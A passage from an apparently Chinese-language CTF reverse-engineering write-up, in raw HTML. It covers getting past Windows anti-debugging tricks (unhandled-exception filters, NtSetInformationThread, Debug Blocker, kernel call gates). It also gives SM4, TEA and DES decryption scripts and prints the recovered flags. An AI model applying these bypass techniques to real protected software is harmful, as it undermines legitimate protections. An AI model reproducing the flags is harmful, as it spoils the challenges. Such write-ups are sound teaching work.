class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">16</span>] = &#123;<span class="number">0x2c</span>, <span class="number">0xa7</span>, <span class="number">0x73</span>, <span class="number">0xe</span>, <span class="number">0x86</span>, <span class="number">0x3c</span>, <span class="number">0xb4</span>, <span class="number">0x5f</span>,</span><br><span class="line"> <span class="number">0x8f</span>, <span class="number">0x87</span>, <span class="number">0xae</span>, <span class="number">0x91</span>, <span class="number">0xf7</span>, <span class="number">0x40</span>, <span class="number">0x11</span>, <span class="number">0xd</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flag[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">flag[<span class="number">15</span>] = (a[<span class="number">15</span>] &lt;&lt; <span class="number">3</span>) | ((a[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>)&amp;<span class="number">7</span>); </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = (a[i] &lt;&lt; <span class="number">3</span>) | ((a[i+<span class="number">1</span>] &gt;&gt; <span class="number">5</span>)&amp;<span class="number">7</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02x"</span>, flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h3><p>程序取出inp文件中的数据，然后进行加密后以hex形式存放入enc文件。</p><p>关键就是其中的一个反调试：</p><p><img src="https://i.loli.net/2021/02/03/QJ1RZLqFW6Axti7.png" alt="image-20210202194810695"></p><p>首先<strong>SetUnhandledExceptionFilter</strong>函数的作用：设置顶层未处理异常过滤器（top-level unhandled exception filter），捕获进程的各个线程中一切未被处理的结构化异常。简单来说就是修改系统最后的异常处理器。</p><p>然后触发<strong>SetUnhandledExceptionFilter</strong>的条件：</p><ul><li>程序中有异常，但没有相应的操作操作去处理该异常。</li><li>程序不处于调试状态。</li></ul><p><img src="https://i.loli.net/2021/02/03/qx619Tjh8yLIrHW.png" alt="image-20210202195228226"></p><p>满足条件后程序将执行设置的异常处理函数来处理该异常。</p><blockquote><p>而一般程序中要么把设置的异常处理函数用来检测程序是否处于调试状态；要么隐藏程序的关键代码，让我们执行不到。</p></blockquote><p>对于触发<strong>SetUnhandledExceptionFilter</strong>的条件，一般程序在调用<strong>SetUnhandledExceptionFilter</strong>后会有故意触发异常的代码，本题就是靠后面的执行无效指令进行触发。而程序是否处于调试状态其实是若出现的异常传递给了程序，程序先调用UnhandledExceptionFilter，而UnhandledExceptionFilter里面又调用了<strong>ZwQueryInformationProcess</strong>进行反调试检测，设置改函数的第二个参数为7，看执行完该函数后第三个参数指向的缓冲区是否为0，若不为0则程序处于调试状态，其实就是看有没有调试端口。</p><p>程序载入OD，设置忽略异常，ctrl+g，输入函数名字来到<strong>ZwQueryInformationProcess</strong>函数，然后下断。</p><p><img src="https://i.loli.net/2021/02/03/W1ubcV5jJ9lResL.png" alt="image-20210202202155455"></p><p>从栈窗口看到第2个参数为7，那就是要找的了，回溯到调用处，在函数执行完后将相应的缓存区的值改为0即可（若程序多次出现这种触发异常的跳转，那我们简单在执行完这个函数后hook一下程序方便些，本题的话直接把后面的je改为jmp就好了）。继续执行，就到了我们想执行的函数了。</p><p><img src="https://i.loli.net/2021/02/03/hT5x1sSw6Nlq7YJ.png" alt="image-20210202205950723"></p><p>而我做本题的时候并没有去过这个反调试，使用的附加调试，然后简单调试了下那个设置为异常处理的函数，发现后面还要触发异常就开始静态分析。</p><p>首先找到引用最后存放加密数据数组的地方：很明显它上下其实是代码的。</p><p><img src="https://i.loli.net/2021/02/03/9Lk3baYopKPJzem.png" alt="image-20210202203529519"></p><p>手动转化一下上面的数据为代码，加上之前调试了下设置异常处理函数，然后很容易发现，代码中有很多用来触发异常的数据（0x0c7, 0xff，且后面跟着2个或3这操作数）。</p><p>又在分析循环代码是发现循环计数器每次没有变，那岂不无限循环，从这里又进而发现，程序每次触发异常跳到设置的异常处理函数的目的：获取当前的eip，修改寄存器的值，修改eip。</p><p>各种opcode的功能：</p><p><img src="https://i.loli.net/2021/02/03/iTCalzSyQhYwrvV.png" alt="image-20210202204604400"></p><p><img src="https://i.loli.net/2021/02/03/fsUpTmPy41KqxXt.png" alt="image-20210202204621359"></p><p>剩下的把相应的触发异常的代码替换为实际的操作，因为加密不复杂，直接看汇编代码分析下就好了。</p><p>首先一个通过指定的index进行一个置换操作，然后典型的移位或加密，最后一个异或。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ind[<span class="number">50</span>], ans[<span class="number">50</span>], tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] = &#123;<span class="number">147</span>, <span class="number">139</span>, <span class="number">143</span>, <span class="number">67</span>, <span class="number">18</span>, <span class="number">104</span>, <span class="number">247</span>,</span><br><span class="line"> <span class="number">144</span>, <span class="number">122</span>, <span class="number">75</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">19</span>, <span class="number">1</span>, <span class="number">180</span>, <span class="number">33</span>, <span class="number">32</span>, <span class="number">115</span>, <span class="number">141</span>, <span class="number">104</span>,</span><br><span class="line"> <span class="number">203</span>, <span class="number">25</span>, <span class="number">252</span>, <span class="number">248</span>, <span class="number">178</span>, <span class="number">107</span>, <span class="number">196</span>, <span class="number">171</span>, <span class="number">200</span>, <span class="number">155</span>, <span class="number">141</span>, <span class="number">34</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> key[] = <span class="string">"Bier"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">tmp += <span class="number">0x11</span>;</span><br><span class="line">tmp &amp;= <span class="number">0x1f</span>;</span><br><span class="line">ind[i] = tmp;</span><br><span class="line"><span class="comment">//printf("%02x ", tmp);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">enc[i] ^= key[i&amp;<span class="number">0x3</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">enc[i] ^= enc[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ans[<span class="number">0</span>] = (enc[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) | (enc[<span class="number">31</span>] &lt;&lt; <span class="number">5</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">ans[i] = (enc[i] &gt;&gt; <span class="number">3</span>) | (enc[i<span class="number">-1</span>] &lt;&lt; <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*for(i = 0; i &lt; 32; i++)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">printf("%02x ", ans[i]);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag[ind[i+<span class="number">1</span>]] = ans[ind[i]];</span><br><span class="line">flag[ind[i]] = ans[ind[i+<span class="number">1</span>]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//B0mb3_L0nd0n_m0rg3n_um_v13r_Uhr.</span></span><br></pre></td></tr></table></figure><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p>拿了二血。</p><p>程序其实利用调用号hook了系统调用r3到r0的转接层，所以从下图中的v11函数指针其实是去执行出题人自己设置的函数。</p><p><img src="https://i.loli.net/2021/02/03/ofAZ4YKhuGjDcR8.png" alt="image-20210202211546712"></p><p>简单跟进行一下v11指向的函数：开始对字符解密得到模块和函数名，就是为了得到函数<strong>NtSetInformationThread</strong>来进行反调试。</p><p><img src="https://i.loli.net/2021/02/03/nph5lyftBDePWmZ.png" alt="image-20210202212312718"></p><p>对于这个反调试之前总结过：</p><p><img src="https://i.loli.net/2021/02/03/MxtYpIG8fNWUDyh.png" alt="image-20210202212558373"></p><p>这里要过它直接patch掉就好了。</p><p>然后就是一些加载dll和函数代码解密相关的操作，做题时节省时间没管，现在还是看看：</p><p><img src="https://i.loli.net/2021/02/03/KdMh8I6VLunaZJC.png" alt="image-20210202213212377"></p><p>使用资源查看工具，找到程序资源中改dll，明显看到是需要进行解密的，也就是后面的操作。</p><p><img src="https://i.loli.net/2021/02/03/t7HSrVNwjb9qZBJ.png" alt="image-20210202213458322"></p><p>继续跟进，看到解密操作只是一个异或：<br><img src="https://i.loli.net/2021/02/03/ysgJIf6lP5uRk1i.png" alt="image-20210202213645891"></p><p>至于后面的操作就是得到相关的函数地址等。</p><p>最后跟到最后的加密函数：字符串就提示了sm4密码，且长度是16，那这个就是key了。sm4密码从常量0xA3B1BAC6也可以识别出来。</p><p><img src="https://i.loli.net/2021/02/03/UFJ7TvwXNgWRxt4.png" alt="image-20210202214023629"></p><p>这里把32的input分2次加密的，每次16位。使用密文解密一下即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pysm4 <span class="keyword">import</span> encrypt, decrypt</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = bytes([<span class="number">234</span>,  <span class="number">99</span>,  <span class="number">88</span>, <span class="number">183</span>, <span class="number">140</span>, <span class="number">226</span>, <span class="number">161</span>, <span class="number">233</span>, <span class="number">197</span>,  <span class="number">41</span>, </span><br><span class="line">  <span class="number">143</span>,  <span class="number">83</span>, <span class="number">232</span>,   <span class="number">8</span>,  <span class="number">50</span>,  <span class="number">89</span>, <span class="number">175</span>,  <span class="number">27</span>, <span class="number">103</span>, <span class="number">174</span>, </span><br><span class="line">  <span class="number">217</span>, <span class="number">218</span>, <span class="number">207</span>, <span class="number">196</span>, <span class="number">114</span>, <span class="number">255</span>, <span class="number">177</span>, <span class="number">236</span>, <span class="number">118</span>, <span class="number">115</span>, </span><br><span class="line">  <span class="number">243</span>, <span class="number">6</span>])</span><br><span class="line">key = <span class="string">b'Ez_5M4_C1pH@r!!!'</span></span><br><span class="line">key = bytes_to_long(key)</span><br><span class="line">c1 = bytes_to_long(c[<span class="number">0</span>:<span class="number">16</span>])</span><br><span class="line">c2 = bytes_to_long(c[<span class="number">16</span>:<span class="number">32</span>])</span><br><span class="line"></span><br><span class="line">flag1 = decrypt(c1, key)</span><br><span class="line">flag2 = decrypt(c2, key)</span><br><span class="line">flag = long_to_bytes(flag1)+long_to_bytes(flag2)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#42b061b4cb41cfa89ca78047bde1856e</span></span><br></pre></td></tr></table></figure><h3 id="child-protect"><a href="#child-protect" class="headerlink" title="child_protect"></a>child_protect</h3><p>拿了二血。。</p><p>从题目名字就想到考点可能是程序自我创建反调试，升级一点就是Debug Blocker技术。尝试下了断点，发现不会断下。然后使用</p><p>procexp查看程序：果然，正如题目名字。</p><p><img src="https://i.loli.net/2021/02/03/NFq5Iep92wZAPGv.png" alt="image-20210202222147793"></p><blockquote><p><strong>Debug Blocker技术特点：</strong></p><ul><li><strong>调试器与被调试器关系中，调试进程与被调试进程首先是一种父子关系。</strong></li><li><strong>子进程进程已经被调试，不能在被其他调试器调试</strong></li><li><strong>强制终止调试进程以切断调试器-被调试器关系时，被调试进程也会同时终止。</strong></li><li><strong>父进程操作被子进程的代码</strong></li><li><strong>父进程处理被子进程中发生的异常</strong></li></ul></blockquote><p>来到creatprocess函数的地方看看：首先创建一个互斥体，目的是为了区别当前运行的是子进程还是父进程，进而执行不同的分支。接下来创建了一个进程。<br><img src="https://i.loli.net/2021/02/03/dtHyc9rBTIlAVXu.png" alt="image-20210202222344171"></p><p><img src="https://i.loli.net/2021/02/03/AUKzcsI8Wl6R1Sx.png" alt="image-20210202223940336"></p><p>然后就是子进程与父进程交互的过程：<br><img src="https://i.loli.net/2021/02/03/Gykoqiu7s1fL3Zg.png" alt="image-20210202224313171"></p><p>具体交互过程：可以看到就2个，那我们不用把程序调试起来，直接手动或idapython修改子进程就行了。</p><p><img src="https://i.loli.net/2021/02/03/sFOHkW1pPUYeGQJ.png" alt="image-20210202224637602"></p><p>第一个就当作花指令处理nop掉多余代码，对于第二个：其实就是把函数中的0x8e32cdaa修改为0x73FF8CA6。</p><p><img src="https://i.loli.net/2021/02/03/zM9IE7ajLCnZOJW.png" alt="image-20210202225101786"></p><p>把修复好的代码反编译：</p><p><img src="https://i.loli.net/2021/02/03/mzFKL9OIEYrMt7y.png" alt="image-20210202225507005"></p><p>对于生成的key，因为计算有点繁琐，这里可以直接在程序运行时修改eip到sub_4110B9函数这里，然后当程序执行到后面时直接查看key。</p><p>最后的tea加密，只是多了一个变换字节序的操作，写解密时注意一下：</p><p><img src="https://i.loli.net/2021/02/03/JDPd89soM2nTCh5.png" alt="image-20210202225850439"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] = &#123;<span class="number">0xed</span>, <span class="number">0xe9</span>, <span class="number">0x8b</span>, <span class="number">0x3b</span>, <span class="number">0xd2</span>, <span class="number">0x85</span>, <span class="number">0xe7</span>, <span class="number">0xeb</span>, <span class="number">0x51</span>, <span class="number">0x16</span>, <span class="number">0x50</span>, <span class="number">0x7a</span>, <span class="number">0xb1</span>, <span class="number">0xdc</span>, <span class="number">0x5d</span>, <span class="number">0x9</span>, <span class="number">0x45</span>, <span class="number">0xae</span>, <span class="number">0xb9</span>, <span class="number">0x15</span>, <span class="number">0x4d</span>, <span class="number">0x8d</span>, <span class="number">0xff</span>, <span class="number">0x50</span>,</span><br><span class="line"> <span class="number">0xde</span>, <span class="number">0xe0</span>, <span class="number">0xbc</span>, <span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xbc</span>, <span class="number">0xfe</span>, <span class="number">0xe1</span>&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[] = &#123;<span class="number">0x82ABA3FE</span>, <span class="number">0x0AC1DDCA8</span>, <span class="number">0x87EC6B60</span>, <span class="number">0x0A2394568</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> enc[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = enc[i];</span><br><span class="line">enc[i] = enc[<span class="number">3</span>-i];</span><br><span class="line">enc[<span class="number">3</span>-i] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v11 = <span class="number">0x73FF8CA6</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">4</span>) <span class="comment">//交换字节序</span></span><br><span class="line">&#123;</span><br><span class="line">swap(enc+i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> delat = <span class="number">0xc6ef3720</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>) -= ((*((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)) &gt;&gt; <span class="number">5</span>) + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">3</span>))^(delat+ *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))))^((*((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)))*<span class="number">0x10</span> + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">2</span>));</span><br><span class="line">*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))) -= ((*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)+<span class="number">1</span>)) &gt;&gt; <span class="number">5</span>) + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">1</span>))^(delat+ *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>))^((*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>))*<span class="number">0x10</span> + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">0</span>));</span><br><span class="line">delat += <span class="number">0x61c88647</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) <span class="comment">//0xc6ef3720</span></span><br><span class="line">&#123;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc + <span class="number">4</span> * i) ^= v11;</span><br><span class="line">v11 -= <span class="number">0x50FFE544</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">4</span>) <span class="comment">//交换字节序</span></span><br><span class="line">&#123;</span><br><span class="line">swap(enc+i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, enc[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内核安全"><a href="#内核安全" class="headerlink" title="内核安全"></a>内核安全</h2><h3 id="easy-kernel"><a href="#easy-kernel" class="headerlink" title="easy_kernel"></a>easy_kernel</h3><p>题目给了一个r3层的程序和一个驱动程序。</p><p>首先r3层程序的情况：红色部分的调用是重点。。</p><p><img src="https://i.loli.net/2021/02/03/diJGIjlXLyp41fr.png" alt="image-20210202231743748"></p><p>然后看看对于驱动文件情况：我们主要关注的就是偏移量为<strong>IRP_MJ_DEVICE_CONTROL</strong>的部分。<br><img src="https://i.loli.net/2021/02/03/QjNn86sM4qOavhE.png" alt="image-20210202232137464"></p><p>进入sub_401270，查看r0层对r3层发出请求的处理：看到0x222000正是r3层程序的值，开始一直以为这里key，正好8个字节，，因为识别了后面的算法为des。</p><p><img src="https://i.loli.net/2021/02/03/Zkvi2DSbAysKo3Y.png" alt="image-20210202232225017"></p><p>后面的des加密很好识别出来，然后开始使用密文和上面以为的key解密，不对，猜测也是。。因为r3层红色地方的调用我没搞清楚的。。</p><p>感觉还是调试起来才能做了，在本地这个驱动服务也没启动起来，然后找了个xp，成功调试起来。首先从des加密结果发现key其实是假flag的前8位且后面还有一个加密操作。才发现这个其实和从r3传过来的参数是对应的，-1这个标志很明显了。。。</p><p><img src="https://i.loli.net/2021/02/03/oDNEmCe5pUcMjr2.png" alt="image-20210202233155105"></p><p>接下来就是看最后的红色代码调用，但只能单步步过，一单步步入就蓝屏😪。。也没心情去找原因。。</p><p>但我猜想这个最后加密肯定是不难的，，开始没注意以为是类似单表加密的，那我可以把0-255的每个加密值找到，再替换一下，试了多组数据后，发现了端倪。。并不是类似单表加密，看了一会了，，发现就是从一位开始一次异或后一位。。hha…</p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> des, ECB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span><span class="params">(a)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">tmp = a[i]</span><br><span class="line">a[i] = a[<span class="number">3</span>-i]</span><br><span class="line">a[<span class="number">3</span>-i] = tmp</span><br><span class="line"><span class="keyword">return</span> a[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">178</span>, <span class="number">196</span>, <span class="number">134</span>, <span class="number">213</span>,  <span class="number">84</span>, <span class="number">108</span>,  <span class="number">56</span>, <span class="number">173</span>, <span class="number">189</span>, <span class="number">105</span>, </span><br><span class="line">  <span class="number">212</span>, <span class="number">233</span>,  <span class="number">68</span>,  <span class="number">71</span>,  <span class="number">54</span>,  <span class="number">33</span>, <span class="number">153</span>, <span class="number">145</span>, <span class="number">251</span>,  <span class="number">19</span>, </span><br><span class="line">  <span class="number">112</span>, <span class="number">216</span>, <span class="number">107</span>, <span class="number">228</span>, <span class="number">128</span>,  <span class="number">18</span>, <span class="number">226</span>,  <span class="number">67</span>,  <span class="number">42</span>,  <span class="number">75</span>, </span><br><span class="line">   <span class="number">73</span>, <span class="number">142</span>]</span><br><span class="line">   </span><br><span class="line"><span class="string">'''  </span></span><br><span class="line"><span class="string">ans = []</span></span><br><span class="line"><span class="string">for i in range(0, 32, 4):</span></span><br><span class="line"><span class="string">ans += swap(enc[i:])</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">enc[i] ^= enc[i+<span class="number">1</span>]</span><br><span class="line">enc = bytes(enc)</span><br><span class="line"></span><br><span class="line">key = <span class="string">b'&#125;aglf_T_'</span></span><br><span class="line"></span><br><span class="line">des_obj = des(key, ECB, pad = <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">code = des_obj.decrypt(enc)</span><br><span class="line">print(code)</span><br><span class="line"><span class="comment">#flag&#123;WelcOme_to_kerne1_world!&#125;</span></span><br></pre></td></tr></table></figure><p>题虽然是做了，但上面红色部分的调用到底是什么呢。</p><p>经过一番搜索，首先从<strong>call fword ptr</strong>知道了这是个长调用，fword代表6个字节。而要想弄清处这个就要了解windows保护模式中的长调用和调用门，段描述符及段选择子的知识了。</p><p>这里就只简单涉及与本题相关的：</p><blockquote><ul><li><strong>长调用开始是push调用者的CS和返回地址。因为最后返回也是多了操作，所以使用的retf</strong>。</li><li><strong>GDTR 寄存器存放的是GDT（全局描述符表）表的位置和大小，低两字节是gdt表的大小，高四字节是gdt表的地址。</strong></li><li><strong>sgdt指令读取GDTR寄存器的值。</strong></li><li><strong>段选择子是一个16位的描述符，指向了定义该段的段描述符，而我们的长调用也就是使用的段选择子来决定。其中3至15位是一个索引，在GDT表中查找出段描述符；第1，2位为RPL，代表了请求特权的级别，如0，3；第三位为TI，如果为0，查GDT表。如果为1，查LDT表，windows中只用GDT，所以这位都是0。</strong></li><li><strong>调用门描述符，共8字节。高16-31位记录偏移地址的高地址，低0-15位记录偏移地址的低地址。低16-31位即是段选择子。</strong></li></ul></blockquote><p>再来看看调用门，指令格式<strong>CALL CS:EIP</strong>，注：EIP是没有使用的，也就是我们的长调用只看段寄存器CS的值，通过它找到对应的段描述符。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">段寄存器的结构：</span><br><span class="line">WORD Selectot  <span class="comment">//段选择子</span></span><br><span class="line">WORD Attribute  <span class="comment">//属性，段描述符高四字节的第8位开始 到第23位结束</span></span><br><span class="line">DWORD Base   <span class="comment">//基地址</span></span><br><span class="line">DWORD Limit <span class="comment">//界限</span></span><br></pre></td></tr></table></figure><p>直接看题目中的：</p><p><img 